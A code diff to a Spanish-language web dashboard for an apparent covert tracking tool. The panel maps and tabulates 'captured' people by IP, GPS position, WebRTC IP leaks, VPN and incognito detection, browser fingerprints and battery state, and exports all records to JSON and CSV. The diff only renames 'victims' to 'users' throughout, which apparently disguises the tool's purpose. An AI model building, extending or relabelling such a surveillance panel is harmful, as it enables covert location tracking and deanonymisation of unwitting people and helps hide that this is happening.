@@ -372,8 +372,8 @@
 
     <div class="stats">
         <div class="stat-card">
-            <h3>Víctimas Totales</h3>
-            <div class="number" id="totalVictims">0</div>
+            <h3>Usuarios Totales</h3>
+            <div class="number" id="totalUsuarios">0</div>
         </div>
         <div class="stat-card">
             <h3>Países Únicos</h3>
@@ -438,10 +438,10 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
-        let victimsData = [];
+        let usuariosData = [];
         let lastDataHash = '';
-        let previousVictimCount = 0;
-        let newVictimIds = new Set();
+        let previousUsuarioCount = 0;
+        let newUsuarioIds = new Set();
         let map = null;
         let markers = [];
         let browsersChart = null;
@@ -480,18 +480,18 @@
             markers.forEach(marker => map.removeLayer(marker));
             markers = [];
 
-            // Agregar marcadores para cada víctima con geolocalización
-            victimsData.forEach(victim => {
+            // Agregar marcadores para cada usuario con geolocalización
+            usuariosData.forEach(usuario => {
                 let lat, lon, source;
 
                 // Priorizar GPS sobre IP
-                if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
-                    lat = victim.geolocation.latitude;
-                    lon = victim.geolocation.longitude;
+                if (usuario.geolocation?.latitude && usuario.geolocation?.longitude) {
+                    lat = usuario.geolocation.latitude;
+                    lon = usuario.geolocation.longitude;
                     source = 'GPS';
-                } else if (victim.network?.latitude && victim.network?.longitude) {
-                    lat = victim.network.latitude;
-                    lon = victim.network.longitude;
+                } else if (usuario.network?.latitude && usuario.network?.longitude) {
+                    lat = usuario.network.latitude;
+                    lon = usuario.network.longitude;
                     source = 'IP';
                 } else {
                     return; // Sin coordenadas
@@ -511,18 +511,18 @@
                 }).addTo(map);
 
                 // Popup con información
-                const vpnBadge = victim.network?.vpnDetection?.likelyVPN ?
+                const vpnBadge = usuario.network?.vpnDetection?.likelyVPN ?
                     `<span style="background: #ff6b6b; padding: 2px 6px; border-radius: 3px; font-size: 10px;">VPN</span>` : '';
 
                 marker.bindPopup(`
                     <div style="color: #000; font-family: Arial, sans-serif;">
-                        <strong style="font-size: 14px;">${victim.username || 'Visitor'}</strong> ${vpnBadge}<br>
-                        <strong>IP:</strong> ${victim.network?.ip || 'N/A'}<br>
-                        <strong>Ubicacion:</strong> ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}<br>
+                        <strong style="font-size: 14px;">${usuario.username || 'Visitor'}</strong> ${vpnBadge}<br>
+                        <strong>IP:</strong> ${usuario.network?.ip || 'N/A'}<br>
+                        <strong>Ubicacion:</strong> ${usuario.network?.city || 'Unknown'}, ${usuario.network?.country || 'Unknown'}<br>
                         <strong>Fuente:</strong> ${source}<br>
-                        <strong>Dispositivo:</strong> ${victim.device?.type || 'Unknown'}<br>
-                        <strong>Navegador:</strong> ${victim.browser?.name || 'Unknown'}<br>
-                        <strong>Fecha:</strong> ${new Date(victim.timestamp).toLocaleString('es-MX')}
+                        <strong>Dispositivo:</strong> ${usuario.device?.type || 'Unknown'}<br>
+                        <strong>Navegador:</strong> ${usuario.browser?.name || 'Unknown'}<br>
+                        <strong>Fecha:</strong> ${new Date(usuario.timestamp).toLocaleString('es-MX')}
                     </div>
                 `);
 
@@ -611,7 +611,7 @@
 
             // Contar navegadores
             const browsers = {};
-            victimsData.forEach(v => {
+            usuariosData.forEach(v => {
                 const browser = v.browser?.name || 'Unknown';
                 browsers[browser] = (browsers[browser] || 0) + 1;
             });
@@ -623,7 +623,7 @@
 
             // Contar dispositivos
             const devices = {};
-            victimsData.forEach(v => {
+            usuariosData.forEach(v => {
                 const device = v.device?.type || 'Unknown';
                 devices[device] = (devices[device] || 0) + 1;
             });
@@ -637,7 +637,7 @@
         // Cargar datos
         async function loadData() {
             try {
-                const response = await fetch('/api/victims');
+                const response = await fetch('/api/usuarios');
                 const newData = await response.json();
 
                 // Crear hash simple de los datos para detectar cambios
@@ -645,25 +645,25 @@
 
                 // Solo actualizar si los datos cambiaron
                 if (newHash !== lastDataHash) {
-                    // Detectar nuevas víctimas
+                    // Detectar nuevos usuarios
                     const currentCount = newData.length;
-                    if (previousVictimCount > 0 && currentCount > previousVictimCount) {
-                        const newVictimCount = currentCount - previousVictimCount;
-                        const latestVictim = newData[newData.length - 1];
-                        const location = `${latestVictim.network?.city || 'Unknown'}, ${latestVictim.network?.country || 'Unknown'}`;
+                    if (previousUsuarioCount > 0 && currentCount > previousUsuarioCount) {
+                        const newUsuarioCount = currentCount - previousUsuarioCount;
+                        const latestUsuario = newData[newData.length - 1];
+                        const location = `${latestUsuario.network?.city || 'Unknown'}, ${latestUsuario.network?.country || 'Unknown'}`;
 
                         // Mostrar notificación
-                        showToast(`Nueva víctima capturada! (${location})`);
+                        showToast(`Nuevo usuario capturado! (${location})`);
 
-                        // Marcar las nuevas víctimas para highlight
-                        newVictimIds.clear();
-                        for (let i = previousVictimCount; i < currentCount; i++) {
-                            newVictimIds.add(`victim-${currentCount - i}`);
+                        // Marcar los nuevos usuarios para highlight
+                        newUsuarioIds.clear();
+                        for (let i = previousUsuarioCount; i < currentCount; i++) {
+                            newUsuarioIds.add(`usuario-${currentCount - i}`);
                         }
                     }
 
-                    previousVictimCount = currentCount;
-                    victimsData = newData;
+                    previousUsuarioCount = currentCount;
+                    usuariosData = newData;
                     lastDataHash = newHash;
 
                     updateStats();
@@ -683,35 +683,35 @@
         }
 
         function updateStats() {
-            document.getElementById('totalVictims').textContent = victimsData.length;
+            document.getElementById('totalUsuarios').textContent = usuariosData.length;
 
-            const uniqueCountries = [...new Set(victimsData.map(v => v.network?.country || 'Unknown'))];
+            const uniqueCountries = [...new Set(usuariosData.map(v => v.network?.country || 'Unknown'))];
             document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
 
-            const gpsCount = victimsData.filter(v => v.geolocation?.latitude).length;
+            const gpsCount = usuariosData.filter(v => v.geolocation?.latitude).length;
             document.getElementById('gpsLocations').textContent = gpsCount;
 
             // ✅ NUEVAS ESTADÍSTICAS
-            const vpnCount = victimsData.filter(v => v.network?.vpnDetection?.likelyVPN).length;
+            const vpnCount = usuariosData.filter(v => v.network?.vpnDetection?.likelyVPN).length;
             document.getElementById('vpnCount').textContent = vpnCount;
 
-            const botCount = victimsData.filter(v => v.device?.isBot).length;
+            const botCount = usuariosData.filter(v => v.device?.isBot).length;
             document.getElementById('botCount').textContent = botCount;
 
-            const incognitoCount = victimsData.filter(v => v.incognitoMode?.isIncognito).length;
+            const incognitoCount = usuariosData.filter(v => v.incognitoMode?.isIncognito).length;
             document.getElementById('incognitoCount').textContent = incognitoCount;
 
-            if (victimsData.length > 0) {
-                const lastVictim = victimsData[victimsData.length - 1];
-                const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
+            if (usuariosData.length > 0) {
+                const lastUsuario = usuariosData[usuariosData.length - 1];
+                const timeAgo = getTimeAgo(new Date(lastUsuario.timestamp));
                 document.getElementById('lastCapture').textContent = timeAgo;
             }
         }
 
         function renderTable() {
-            if (victimsData.length === 0) {
+            if (usuariosData.length === 0) {
                 document.getElementById('tableContainer').innerHTML =
-                    '<p class="loading">No hay víctimas capturadas aún.</p>';
+                    '<p class="loading">No hay usuarios capturados aún.</p>';
                 return;
             }
 
@@ -732,18 +732,18 @@
                     <tbody>
             `;
 
-            const reversedVictims = [...victimsData].reverse();
-            reversedVictims.forEach((victim, index) => {
-                const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
+            const reversedUsuarios = [...usuariosData].reverse();
+            reversedUsuarios.forEach((usuario, index) => {
+                const hasGPS = usuario.geolocation?.latitude && usuario.geolocation?.longitude;
 
                 // Determinar badge de ubicación
                 let locationBadge = '';
-                const locationSource = victim.network?.locationSource;
+                const locationSource = usuario.network?.locationSource;
                 if (locationSource === 'gps') {
                     locationBadge = '<span class="location-badge location-gps">GPS</span>';
                 } else if (locationSource === 'ipapi') {
                     locationBadge = '<span class="location-badge location-ip">IP</span>';
-                } else if (victim.network?.fromCache) {
+                } else if (usuario.network?.fromCache) {
                     locationBadge = '<span class="location-badge location-cache">CACHE</span>';
                 } else {
                     locationBadge = '<span class="location-badge location-ip">IP</span>';
@@ -752,48 +752,48 @@
                 // Coordenadas
                 let coordsHTML = 'N/A';
                 if (hasGPS) {
-                    const lat = victim.geolocation.latitude.toFixed(4);
-                    const lon = victim.geolocation.longitude.toFixed(4);
+                    const lat = usuario.geolocation.latitude.toFixed(4);
+                    const lon = usuario.geolocation.longitude.toFixed(4);
                     const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">${lat}, ${lon}</a>`;
                 }
 
                 // IP y WebRTC
-                let ipHTML = victim.network?.ip || 'Unknown';
-                if (victim.webRTC?.publicIP && victim.webRTC.publicIP !== 'Unknown' && victim.webRTC.publicIP !== victim.network?.ip) {
-                    ipHTML += `<br><span class="webrtc-leak" title="WebRTC Leak">${victim.webRTC.publicIP}</span>`;
+                let ipHTML = usuario.network?.ip || 'Unknown';
+                if (usuario.webRTC?.publicIP && usuario.webRTC.publicIP !== 'Unknown' && usuario.webRTC.publicIP !== usuario.network?.ip) {
+                    ipHTML += `<br><span class="webrtc-leak" title="WebRTC Leak">${usuario.webRTC.publicIP}</span>`;
                 }
 
                 // Navegador con badge de incógnito
-                let browserHTML = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
-                if (victim.incognitoMode?.isIncognito) {
-                    const confidence = victim.incognitoMode.confidence || 'low';
+                let browserHTML = `${usuario.browser?.name || 'Unknown'} ${usuario.browser?.version || ''}`;
+                if (usuario.incognitoMode?.isIncognito) {
+                    const confidence = usuario.incognitoMode.confidence || 'low';
                     browserHTML += `<span class="incognito-badge" title="Incógnito - Confianza: ${confidence}">INCOGNITO</span>`;
                 }
 
                 // Dispositivo con badges
-                let deviceHTML = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
-                if (victim.device?.isBot) {
+                let deviceHTML = `${usuario.device?.type || 'Unknown'} - ${usuario.os?.name || 'Unknown'}`;
+                if (usuario.device?.isBot) {
                     deviceHTML += '<span class="bot-badge">BOT</span>';
                 }
 
                 // Ubicación con VPN badge
-                let locationHTML = `${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}`;
-                if (victim.network?.vpnDetection?.likelyVPN) {
-                    const confidence = victim.network.vpnDetection.confidence || 'low';
+                let locationHTML = `${locationBadge} ${usuario.network?.city || 'Unknown'}, ${usuario.network?.country || 'Unknown'}`;
+                if (usuario.network?.vpnDetection?.likelyVPN) {
+                    const confidence = usuario.network.vpnDetection.confidence || 'low';
                     locationHTML += `<span class="vpn-badge" title="VPN Confianza: ${confidence}">VPN</span>`;
                 }
 
-                const date = new Date(victim.timestamp).toLocaleString('es-MX');
-                const victimId = `victim-${victimsData.length - index}`;
+                const date = new Date(usuario.timestamp).toLocaleString('es-MX');
+                const usuarioId = `usuario-${usuariosData.length - index}`;
 
-                // Agregar clase de highlight si es víctima nueva
-                const highlightClass = newVictimIds.has(victimId) ? ' new-victim-highlight' : '';
+                // Agregar clase de highlight si es usuario nuevo
+                const highlightClass = newUsuarioIds.has(usuarioId) ? ' new-victim-highlight' : '';
 
                 tableHTML += `
-                    <tr class="clickable${highlightClass}" onclick="toggleDetails('${victimId}')">
-                        <td>${victimsData.length - index}</td>
-                        <td><strong>${victim.username || 'Visitor'}</strong></td>
+                    <tr class="clickable${highlightClass}" onclick="toggleDetails('${usuarioId}')">
+                        <td>${usuariosData.length - index}</td>
+                        <td><strong>${usuario.username || 'Visitor'}</strong></td>
                         <td>${ipHTML}</td>
                         <td>${locationHTML}</td>
                         <td>${coordsHTML}</td>
@@ -801,9 +801,9 @@
                         <td>${browserHTML}</td>
                         <td>${date}</td>
                     </tr>
-                    <tr class="details-row" id="details-${victimId}">
+                    <tr class="details-row" id="details-${usuarioId}">
                         <td colspan="8">
-                            ${generateDetailsHTML(victim)}
+                            ${generateDetailsHTML(usuario)}
                         </td>
                     </tr>
                 `;
@@ -813,19 +813,19 @@
             document.getElementById('tableContainer').innerHTML = tableHTML;
         }
 
-        function toggleDetails(victimId) {
-            const detailsRow = document.getElementById('details-' + victimId);
+        function toggleDetails(usuarioId) {
+            const detailsRow = document.getElementById('details-' + usuarioId);
             if (detailsRow) {
                 detailsRow.classList.toggle('show');
             }
         }
 
-        function generateDetailsHTML(victim) {
+        function generateDetailsHTML(usuario) {
             let html = '<div class="details-content">';
 
             // VPN Detection
-            if (victim.network?.vpnDetection) {
-                const vpn = victim.network.vpnDetection;
+            if (usuario.network?.vpnDetection) {
+                const vpn = usuario.network.vpnDetection;
                 const confidenceColor = {
                     'high': '#ff6b6b',
                     'medium': '#ffa500',
@@ -863,23 +863,23 @@
             }
 
             // WebRTC Info
-            if (victim.webRTC) {
+            if (usuario.webRTC) {
                 html += `
                     <div class="details-section">
                         <h4>WebRTC Information</h4>
                         <div class="details-grid">
                             <div class="detail-item">
                                 <div class="detail-label">IP Local</div>
-                                <div class="detail-value">${victim.webRTC.localIP || 'N/A'}</div>
+                                <div class="detail-value">${usuario.webRTC.localIP || 'N/A'}</div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">IP Publica (WebRTC)</div>
-                                <div class="detail-value">${victim.webRTC.publicIP || 'N/A'}</div>
+                                <div class="detail-value">${usuario.webRTC.publicIP || 'N/A'}</div>
                             </div>
-                            ${victim.webRTC.allIPs ? `
+                            ${usuario.webRTC.allIPs ? `
                                 <div class="detail-item" style="grid-column: span 2;">
                                     <div class="detail-label">Todas las IPs</div>
-                                    <div class="detail-value">${victim.webRTC.allIPs.join(', ')}</div>
+                                    <div class="detail-value">${usuario.webRTC.allIPs.join(', ')}</div>
                                 </div>
                             ` : ''}
                         </div>
@@ -888,29 +888,29 @@
             }
 
             // Incognito Mode Detection
-            if (victim.incognitoMode) {
+            if (usuario.incognitoMode) {
                 const confidenceColor = {
                     'high': '#ff6b6b',
                     'medium': '#ffd93d',
                     'low': '#6bcf7f'
                 };
-                const color = confidenceColor[victim.incognitoMode.confidence] || '#888';
+                const color = confidenceColor[usuario.incognitoMode.confidence] || '#888';
 
                 let methodsHTML = '';
-                if (victim.incognitoMode.methods && victim.incognitoMode.methods.length > 0) {
-                    methodsHTML = victim.incognitoMode.methods.map(m =>
+                if (usuario.incognitoMode.methods && usuario.incognitoMode.methods.length > 0) {
+                    methodsHTML = usuario.incognitoMode.methods.map(m =>
                         `<span style="background: rgba(255,107,107,0.15); padding: 4px 10px; border-radius: 4px; margin: 2px; display: inline-block; font-size: 12px;">${m}</span>`
                     ).join('');
-                } else if (victim.incognitoMode.method) {
-                    methodsHTML = `<span style="background: rgba(255,107,107,0.15); padding: 4px 10px; border-radius: 4px;">${victim.incognitoMode.method}</span>`;
+                } else if (usuario.incognitoMode.method) {
+                    methodsHTML = `<span style="background: rgba(255,107,107,0.15); padding: 4px 10px; border-radius: 4px;">${usuario.incognitoMode.method}</span>`;
                 } else {
                     methodsHTML = 'N/A';
                 }
 
                 // Tests realizados
                 let testsHTML = '';
-                if (victim.incognitoMode.tests) {
-                    const tests = victim.incognitoMode.tests;
+                if (usuario.incognitoMode.tests) {
+                    const tests = usuario.incognitoMode.tests;
                     testsHTML = '<div style="margin-top: 15px; padding: 12px; background: rgba(0,0,0,0.03); border-radius: 6px; border-left: 3px solid #ff6b6b;">';
                     testsHTML += '<strong style="color: #333; font-size: 13px;">Tests Realizados:</strong><br><div style="margin-top: 8px; font-size: 12px; line-height: 1.8;">';
 
@@ -949,20 +949,20 @@
                         <div class="details-grid">
                             <div class="detail-item">
                                 <div class="detail-label">Modo Incognito</div>
-                                <div class="detail-value" style="color: ${victim.incognitoMode.isIncognito ? '#ff4444' : '#4CAF50'}; font-weight: bold; font-size: 16px;">
-                                    ${victim.incognitoMode.isIncognito ? 'SI DETECTADO' : 'NO'}
+                                <div class="detail-value" style="color: ${usuario.incognitoMode.isIncognito ? '#ff4444' : '#4CAF50'}; font-weight: bold; font-size: 16px;">
+                                    ${usuario.incognitoMode.isIncognito ? 'SI DETECTADO' : 'NO'}
                                 </div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">Confianza</div>
                                 <div class="detail-value" style="color: ${color}; font-weight: bold; text-transform: uppercase; font-size: 14px;">
-                                    ${victim.incognitoMode.confidence || 'N/A'}
+                                    ${usuario.incognitoMode.confidence || 'N/A'}
                                 </div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">Indicadores</div>
-                                <div class="detail-value" style="font-weight: bold; font-size: 18px; color: ${victim.incognitoMode.indicators >= 3 ? '#ff4444' : '#666'};">
-                                    ${victim.incognitoMode.indicators || 0}
+                                <div class="detail-value" style="font-weight: bold; font-size: 18px; color: ${usuario.incognitoMode.indicators >= 3 ? '#ff4444' : '#666'};">
+                                    ${usuario.incognitoMode.indicators || 0}
                                 </div>
                             </div>
                         </div>
@@ -976,27 +976,27 @@
             }
 
             // Fingerprints
-            if (victim.fingerprints) {
+            if (usuario.fingerprints) {
                 html += `
                     <div class="details-section">
                         <h4>Fingerprints</h4>
                         <div class="details-grid">
                             <div class="detail-item">
                                 <div class="detail-label">Canvas</div>
-                                <div class="detail-value">${victim.fingerprints.canvas?.substring(0, 20) || 'N/A'}...</div>
+                                <div class="detail-value">${usuario.fingerprints.canvas?.substring(0, 20) || 'N/A'}...</div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">WebGL Renderer</div>
-                                <div class="detail-value">${victim.fingerprints.webglRenderer || 'N/A'}</div>
+                                <div class="detail-value">${usuario.fingerprints.webglRenderer || 'N/A'}</div>
                             </div>
-                            ${victim.fingerprints.audio ? `
+                            ${usuario.fingerprints.audio ? `
                                 <div class="detail-item">
                                     <div class="detail-label">Audio Hash</div>
-                                    <div class="detail-value">${victim.fingerprints.audio.hash || 'N/A'}</div>
+                                    <div class="detail-value">${usuario.fingerprints.audio.hash || 'N/A'}</div>
                                 </div>
                                 <div class="detail-item">
                                     <div class="detail-label">Audio Sample Rate</div>
-                                    <div class="detail-value">${victim.fingerprints.audio.sampleRate || 'N/A'} Hz</div>
+                                    <div class="detail-value">${usuario.fingerprints.audio.sampleRate || 'N/A'} Hz</div>
                                 </div>
                             ` : ''}
                         </div>
@@ -1011,30 +1011,30 @@
                     <div class="details-grid">
                         <div class="detail-item">
                             <div class="detail-label">Tipo</div>
-                            <div class="detail-value">${victim.device?.type || 'Unknown'}</div>
+                            <div class="detail-value">${usuario.device?.type || 'Unknown'}</div>
                         </div>
                         <div class="detail-item">
                             <div class="detail-label">CPU Cores</div>
-                            <div class="detail-value">${victim.device?.cpuCores || 'N/A'}</div>
+                            <div class="detail-value">${usuario.device?.cpuCores || 'N/A'}</div>
                         </div>
                         <div class="detail-item">
                             <div class="detail-label">Memoria</div>
-                            <div class="detail-value">${victim.device?.memory || 'N/A'}</div>
+                            <div class="detail-value">${usuario.device?.memory || 'N/A'}</div>
                         </div>
                         <div class="detail-item">
                             <div class="detail-label">Bot</div>
-                            <div class="detail-value">${victim.device?.isBot ? 'Si' : 'No'}</div>
+                            <div class="detail-value">${usuario.device?.isBot ? 'Si' : 'No'}</div>
                         </div>
                         <div class="detail-item">
                             <div class="detail-label">Headless</div>
-                            <div class="detail-value">${victim.device?.isHeadless ? 'Si' : 'No'}</div>
+                            <div class="detail-value">${usuario.device?.isHeadless ? 'Si' : 'No'}</div>
                         </div>
                     </div>
                 </div>
             `;
 
             // Battery Status
-            if (victim.battery) {
+            if (usuario.battery) {
                 html += `
                     <div class="details-section">
                         <h4>Estado de Bateria</h4>
@@ -1042,27 +1042,27 @@
                             <div class="detail-item">
                                 <div class="detail-label">Nivel</div>
                                 <div class="detail-value" style="font-weight: bold; color: ${
-                                    victim.battery.level === 'Unknown' ? '#888' :
-                                    parseInt(victim.battery.level) > 50 ? '#4CAF50' :
-                                    parseInt(victim.battery.level) > 20 ? '#ffa500' : '#ff6b6b'
+                                    usuario.battery.level === 'Unknown' ? '#888' :
+                                    parseInt(usuario.battery.level) > 50 ? '#4CAF50' :
+                                    parseInt(usuario.battery.level) > 20 ? '#ffa500' : '#ff6b6b'
                                 };">
-                                    ${victim.battery.level || 'N/A'}
+                                    ${usuario.battery.level || 'N/A'}
                                 </div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">Cargando</div>
-                                <div class="detail-value">${victim.battery.charging ? 'SI' : 'NO'}</div>
+                                <div class="detail-value">${usuario.battery.charging ? 'SI' : 'NO'}</div>
                             </div>
-                            ${victim.battery.chargingTime && victim.battery.chargingTime !== 'N/A' ? `
+                            ${usuario.battery.chargingTime && usuario.battery.chargingTime !== 'N/A' ? `
                                 <div class="detail-item">
                                     <div class="detail-label">Tiempo de Carga</div>
-                                    <div class="detail-value">${victim.battery.chargingTime}</div>
+                                    <div class="detail-value">${usuario.battery.chargingTime}</div>
                                 </div>
                             ` : ''}
-                            ${victim.battery.dischargingTime && victim.battery.dischargingTime !== 'N/A' ? `
+                            ${usuario.battery.dischargingTime && usuario.battery.dischargingTime !== 'N/A' ? `
                                 <div class="detail-item">
                                     <div class="detail-label">Tiempo Restante</div>
-                                    <div class="detail-value">${victim.battery.dischargingTime}</div>
+                                    <div class="detail-value">${usuario.battery.dischargingTime}</div>
                                 </div>
                             ` : ''}
                         </div>
@@ -1071,22 +1071,22 @@
             }
 
             // Timezone & Location
-            if (victim.timezoneInfo) {
+            if (usuario.timezoneInfo) {
                 html += `
                     <div class="details-section">
                         <h4>Timezone & Locale</h4>
                         <div class="details-grid">
                             <div class="detail-item">
                                 <div class="detail-label">Timezone</div>
-                                <div class="detail-value">${victim.timezoneInfo.timezone || 'N/A'}</div>
+                                <div class="detail-value">${usuario.timezoneInfo.timezone || 'N/A'}</div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">Offset</div>
-                                <div class="detail-value">${victim.timezoneInfo.offset || 'N/A'} min</div>
+                                <div class="detail-value">${usuario.timezoneInfo.offset || 'N/A'} min</div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">Locale</div>
-                                <div class="detail-value">${victim.timezoneInfo.locale || 'N/A'}</div>
+                                <div class="detail-value">${usuario.timezoneInfo.locale || 'N/A'}</div>
                             </div>
                         </div>
                     </div>
@@ -1106,16 +1106,16 @@
         }
 
         async function reprocessLocations() {
-            const unknownCount = victimsData.filter(v =>
+            const unknownCount = usuariosData.filter(v =>
                 v.network?.city === 'Unknown' || v.network?.country === 'Unknown'
             ).length;
 
             if (unknownCount === 0) {
-                alert('No hay víctimas con ubicación Unknown para reprocesar.');
+                alert('No hay usuarios con ubicación Unknown para reprocesar.');
                 return;
             }
 
-            if (confirm(`Se encontraron ${unknownCount} víctimas con ubicación Unknown.\n\n¿Quieres intentar obtener sus ubicaciones de nuevo?\n\nEsto puede tardar varios minutos.`)) {
+            if (confirm(`Se encontraron ${unknownCount} usuarios con ubicación Unknown.\n\n¿Quieres intentar obtener sus ubicaciones de nuevo?\n\nEsto puede tardar varios minutos.`)) {
                 try {
                     const button = event.target;
                     button.disabled = true;
@@ -1190,13 +1190,13 @@
 
         async function exportData() {
             try {
-                const dataStr = JSON.stringify(victimsData, null, 2);
+                const dataStr = JSON.stringify(usuariosData, null, 2);
                 const dataBlob = new Blob([dataStr], { type: 'application/json' });
 
                 const url = URL.createObjectURL(dataBlob);
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = `victims_${new Date().toISOString()}.json`;
+                link.download = `usuarios_${new Date().toISOString()}.json`;
                 link.click();
                 URL.revokeObjectURL(url);
             } catch (error) {
@@ -1207,7 +1207,7 @@
         async function exportCSV() {
             try {
                 let csv = 'Timestamp,Username,IP,Country,City,Latitude,Longitude,Device,OS,Browser\n';
-                victimsData.forEach(v => {
+                usuariosData.forEach(v => {
                     const lat = v.geolocation?.latitude || '';
                     const lon = v.geolocation?.longitude || '';
                     csv += `"${v.timestamp}","${v.username || 'N/A'}","${v.network?.ip || ''}","${v.network?.country || ''}","${v.network?.city || ''}","${lat}","${lon}","${v.device?.type || ''}","${v.os?.name || ''}","${v.browser?.name || ''}"\n`;
@@ -1217,7 +1217,7 @@
                 const url = URL.createObjectURL(blob);
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = `victims_${new Date().toISOString()}.csv`;
+                link.download = `usuarios_${new Date().toISOString()}.csv`;
                 link.click();
                 URL.revokeObjectURL(url);
             } catch (error) {
